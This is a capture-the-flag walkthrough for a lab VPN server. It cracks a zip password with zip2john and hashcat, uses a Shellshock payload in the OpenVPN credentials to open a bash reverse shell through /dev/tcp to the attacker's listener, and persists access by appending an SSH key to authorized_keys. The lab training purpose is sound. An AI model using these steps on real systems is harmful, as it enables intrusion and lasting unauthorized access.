# VPN Server

1. **Resume From [Mail Server](/2_mail_server/)**
2. **Get OVPN from Mail Server: [257-2.msg](/2_mail_server/08-store0/6/msg/0/257-2.msg)**
3. **Decode Zip File from Base64: `https://gchq.github.io/CyberChef/`**
4. **Install `John The Ripper`**

5. **Generate Hash:**

    ```shell
    ~/CTF/JohnTheRipper/run/zip2john 3_vpn.zip > hashes/5-zip_hashes.txt
    ```

6. **Edit File (remove file names from hashes): [Zip Hashes](./hashes/6-zip_hashes.txt)**
7. **Run Hashcat**

    ```shell
    hashcat -m 13600 -a 3 ./hashes/6-zip_hashes.txt "?l?l?l?l?l?l?l"

    # to show Results
    hashcat -m 13600 -a 3 ./hashes/6-zip_hashes.txt "?l?l?l?l?l?l?l" --show > hashes/7-hashcat.txt
    ```

8. **Hashcat Results in [Hashcat](./hashes/07-hashcat.txt): `ehsanit`**
9. **Using ShellShock OpenVPN Exploit: [CVE-2014-6271](./34879.txt)**

10. **Extract and Edit: `09_vpn\client.ovpn`**

    ```shell
    remote 172.16.3.64 1194
    ```

11. **Make SSH key**

    ```shell
    ssh-keygen -t ed25519 -f ./id_ed25519 -N ""
    ```

12. **Start:**

    ```shell
    nc -l 0.0.0.0 9696
    ```

13. **Let's Connect:**

    ```shell
    cd 9_vpn
    openvpn client.ovpn
    ```

14. **Send Username, Password**

    ```shell
    () { :;};/bin/bash -i >& /dev/tcp/10.8.0.29/9696 0>&1 &
    ```

15. **Read Flag: `MAZAPA_1a75e527fd045659662be54a5171627f`**

16. **Persist Your Connection:**

    ```shell
    echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCswCp0rS8p6Ost8dvKK7ZQHrrgfEYo1JM1cEroUnY4 danial@pop-os >> ~/.ssh/authorized_keys

    cat ~/.ssh/authorized_keys

    chmod 600 ~/.ssh/authorized_keys 
    ```

17. **Connect with SSH**

    ```shell
    ssh -i ./id_ed25519 -p 2200 vpn_user@172.16.3.64
    ```
